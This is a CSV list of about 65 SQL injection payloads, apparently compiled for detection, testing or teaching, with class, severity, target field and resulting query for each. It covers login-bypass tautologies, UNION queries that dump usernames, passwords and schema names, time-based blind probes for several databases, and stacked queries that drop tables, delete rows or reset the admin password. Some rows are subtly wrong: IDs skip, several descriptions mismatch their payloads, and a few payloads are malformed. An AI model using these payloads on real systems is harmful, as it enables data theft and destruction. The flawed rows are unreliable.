id,attack_class,payload,type,severity,context,description,example
sqli-001,sqli,' OR '1'='1,tautology,high,Login form username input,Basic tautology-based SQL injection,SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
sqli-002,sqli,"' UNION SELECT username, password FROM users--",union,high,Search input field,Union-based SQL injection to extract data,"SELECT name, description FROM products WHERE name = '' UNION SELECT username, password FROM users--"
sqli-003,sqli,'; WAITFOR DELAY '0:0:5'--,blind-time,medium,ID parameter in URL,Blind SQL injection with time delay,SELECT * FROM orders WHERE id = ''; WAITFOR DELAY '0:0:5'--
sqli-004,sqli,"' AND 1=CONVERT(int,@@version)--",error-based,medium,User ID input,Error-based SQL injection to reveal database version,"SELECT * FROM users WHERE id = '' AND 1=CONVERT(int,@@version)--"
sqli-005,sqli,' AND 1=1--,boolean-blind,medium,Search field,Boolean-based blind SQL injection,SELECT * FROM products WHERE name = '' AND 1=1--
sqli-006,sqli,'; DROP TABLE users--,stacked-queries,critical,User input in form,Stacked queries to execute multiple statements,SELECT * FROM users WHERE username = ''; DROP TABLE users--
sqli-007,sqli,' OR 1=1--,tautology,high,Login password field,Using comment to truncate query,SELECT * FROM users WHERE password = '' OR 1=1--
sqli-008,sqli,0x27 OR 0x31=0x31--,tautology,medium,URL parameter,Hex encoded payload,SELECT * FROM products WHERE id = 0x27 OR 0x31=0x31--
sqli-009,sqli,'; SELECT pg_sleep(5)--,blind-time,medium,PostgreSQL ID parameter,Using sleep for blind time-based injection,SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(5)--
sqli-010,sqli,"' AND 1=CONVERT(int,USER())--",error-based,medium,User input,Extracting database user with error-based injection,"SELECT * FROM accounts WHERE user = '' AND 1=CONVERT(int,USER())--"
sqli-011,sqli,"' AND SUBSTRING(@@version,1,1)='5'--",boolean-blind,medium,Search input,Blind boolean-based injection with AND condition,"SELECT * FROM products WHERE name = '' AND SUBSTRING(@@version,1,1)='5'--"
sqli-012,sqli,' OR 'a'='a,tautology,high,Login username,Using OR with false condition to bypass filters,SELECT * FROM users WHERE username = '' OR 'a'='a' AND password = ''
sqli-013,sqli,' OR 1=1-- -,tautology,high,Search field,Using double dash comment to truncate query,SELECT * FROM items WHERE name = '' OR 1=1-- -
sqli-014,sqli,'//OR//1=1--,tautology,high,Login form,Using inline comment to bypass filters,SELECT * FROM users WHERE username = ''//OR//1=1--
sqli-015,sqli,' OR CAST('a' AS INT)=CAST('a' AS INT)--,tautology,medium,User input,Using cast to bypass filters,SELECT * FROM users WHERE username = '' OR CAST('a' AS INT)=CAST('a' AS INT)--
sqli-016,sqli,' OR SLEEP(5)--,blind-time,medium,ID parameter,Using sleep in MySQL for time-based blind injection,SELECT * FROM orders WHERE id = '' OR SLEEP(5)--
sqli-017,sqli,"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",error-based,high,User input,Using extractvalue for error-based injection,"SELECT * FROM users WHERE id = '' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
sqli-018,sqli,"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",error-based,high,User input,Using updatexml for error-based injection,"SELECT * FROM users WHERE id = '' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
sqli-019,sqli,'; SELECT pg_sleep(10)--,blind-time,medium,ID parameter,Using sleep in PostgreSQL for time-based injection,SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(10)--
sqli-020,sqli,' OR 1=1#,tautology,high,Login form,Using OR with false condition and comment,SELECT * FROM users WHERE username = '' OR 1=1#
sqli-021,sqli,' OR SLEEP(10)--,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL,SELECT * FROM products WHERE name = '' OR SLEEP(10)--
sqli-022,sqli,"' UNION SELECT NULL, NULL, username, password FROM users--",union,high,Search field,Using UNION SELECT with NULLs to bypass column count,"SELECT id, name, description FROM products WHERE name = '' UNION SELECT NULL, NULL, username, password FROM users--"
sqli-023,sqli,' OR 1=1/*,tautology,high,Login username,Using OR with false condition and inline comment,SELECT * FROM users WHERE username = '' OR 1=1/*
sqli-024,sqli,' AND (SELECT COUNT(*) FROM users) > 0--,boolean-blind,medium,Search input,Using AND with subquery for blind boolean injection,SELECT * FROM products WHERE name = '' AND (SELECT COUNT(*) FROM users) > 0--
sqli-025,sqli,' OR pg_sleep(7)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL,SELECT * FROM orders WHERE id = '' OR pg_sleep(7)--
sqli-026,sqli,"' UNION SELECT database(), NULL--",union,high,Search input,Using UNION SELECT with database() function,"SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--"
sqli-027,sqli,'; WAITFOR DELAY '0:0:10'--,blind-time,medium,User ID input,Using OR with sleep for time delay in SQL Server,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:10'--
sqli-028,sqli,' OR CAST(1 AS INT)=1--,tautology,medium,Login form,Using OR with cast to bypass filters,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1--
sqli-029,sqli,"' OR SUBSTRING(user(),1,1)='r'--",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='r'--"
sqli-030,sqli,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,blind-time,medium,User input,Using OR with sleep for time delay in Oracle,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--
sqli-031,sqli,"' UNION SELECT table_name, NULL FROM information_schema.tables--",union,high,Search input,Using UNION SELECT with information_schema.tables,"SELECT name, description FROM products WHERE name = '' UNION SELECT table_name, NULL FROM information_schema.tables--"
sqli-032,sqli,' OR (SELECT sleep(5))--,blind-time,medium,ID parameter,Using OR with sleep for time delay in SQLite,SELECT * FROM orders WHERE id = '' OR (SELECT sleep(5))--
sqli-033,sqli,' OR 0x61646d696e=0x61646d696e--,tautology,medium,Login username,Using OR with hex encoded string,SELECT * FROM users WHERE username = '' OR 0x61646d696e=0x61646d696e--
sqli-034,sqli,' OR SLEEP(5)#,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with comment,SELECT * FROM products WHERE name = '' OR SLEEP(5)#
sqli-035,sqli,"' UNION SELECT user(), NULL--",union,high,Search input,Using UNION SELECT with user() function,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
sqli-036,sqli,' OR pg_sleep(3)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(3)--
sqli-037,sqli,'; WAITFOR DELAY '0:0:3'--,blind-time,medium,User ID input,Using OR with sleep for time delay in SQL Server with comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:3'--
sqli-038,sqli,"' OR SUBSTRING(@@version,1,1)='5'--",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='5'--"
sqli-039,sqli,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,blind-time,medium,User input,Using OR with sleep for time delay in Oracle with comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--
sqli-040,sqli,"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",stacked-queries,critical,User input,Using stacked queries to insert data,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--"
sqli-041,sqli,' OR SLEEP(8)/*,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with inline comment,SELECT * FROM products WHERE name = '' OR SLEEP(8)/*
sqli-043,sqli,"' OR SUBSTRING(user(),1,1)='a'/*",boolean-blind,medium,Login input,Using OR with substring for blind boolean injection with inline comment,"SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='a'/*"
sqli-044,sqli,'; UPDATE users SET password='hacked' WHERE username='admin'--,stacked-queries,critical,User input,Using stacked queries to update data,SELECT * FROM users WHERE username = ''; UPDATE users SET password='hacked' WHERE username='admin'--
sqli-045,sqli,' OR pg_sleep(6)/*,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with inline comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(6)/*
sqli-046,sqli,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",union,high,Search input,Using UNION SELECT to extract column names,"SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"
sqli-047,sqli,' OR CAST('1' AS INT)=1--,tautology,medium,Login form,Using OR with cast for tautology,SELECT * FROM users WHERE username = '' OR CAST('1' AS INT)=1--
sqli-048,sqli,'; WAITFOR DELAY '0:0:7'/*,blind-time,medium,User ID input,Using OR with sleep for time delay in SQL Server with inline comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:7'/*
sqli-049,sqli,"' OR SUBSTRING(@@version,1,1)='8'#",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with hash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='8'#"
sqli-051,sqli,' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,blind-time,medium,User input,Using OR with sleep for time delay in Oracle with inline comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/
sqli-052,sqli,'; DELETE FROM users WHERE username='guest'--,stacked-queries,critical,User input,Using stacked queries to delete data,SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='guest'--
sqli-053,sqli,' OR 0x31=0x31--,tautology,medium,Login username,Using OR with hex encoded tautology,SELECT * FROM users WHERE username = '' OR 0x31=0x31--
sqli-054,sqli,' OR SLEEP(9)#,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with hash comment,SELECT * FROM products WHERE name = '' OR SLEEP(9)#
sqli-055,sqli,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",union,high,Search input,Using UNION SELECT to extract schema names,"SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
sqli-056,sqli,' OR pg_sleep(4)#,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with hash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(4)#
sqli-057,sqli,' OR CAST(1 AS INT)=1/*,tautology,medium,Login form,Using OR with cast for tautology with inline comment,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1/*
sqli-058,sqli,"' OR SUBSTRING(user(),1,1)='b'/*",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with inline comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='b'/*"
sqli-060,sqli,"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",stacked-queries,critical,User input,Using stacked queries to create new user,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--"
sqli-061,sqli,'; WAITFOR DELAY '0:0:5'#,blind-time,medium,User ID input,Using OR with sleep for time delay in SQL Server with hash comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:5'#
sqli-062,sqli,"' OR SUBSTRING(@@version,1,1)='9'#",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with hash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='9'#"
sqli-064,sqli,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,blind-time,medium,User input,Using OR with sleep for time delay in Oracle with hash comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#
sqli-065,sqli,'; DROP TABLE sessions--,stacked-queries,critical,User input,Using stacked queries to drop table,SELECT * FROM users WHERE username = ''; DROP TABLE sessions--
sqli-066,sqli,' OR 0x41=0x41--,tautology,medium,Login username,Using OR with hex encoded tautology with comment,SELECT * FROM users WHERE username = '' OR 0x41=0x41--
sqli-067,sqli,' OR SLEEP(11)--,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(11)--
sqli-069,sqli,' OR pg_sleep(12)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(12)--
sqli-070,sqli,'; UPDATE users SET password='newpass' WHERE username='admin'--,stacked-queries,critical,User input,Using stacked queries to update admin password,SELECT * FROM users WHERE username = ''; UPDATE users SET password='newpass' WHERE username='admin'--
sqli-071,sqli,' OR SLEEP(12)--,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(12)--
sqli-072,sqli,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",union,high,Search input,Using UNION SELECT to extract column names with comment,"SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--"
sqli-073,sqli,"' OR SUBSTRING(user(),1,1)='c'--",boolean-blind,medium,Login input,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='c'--"
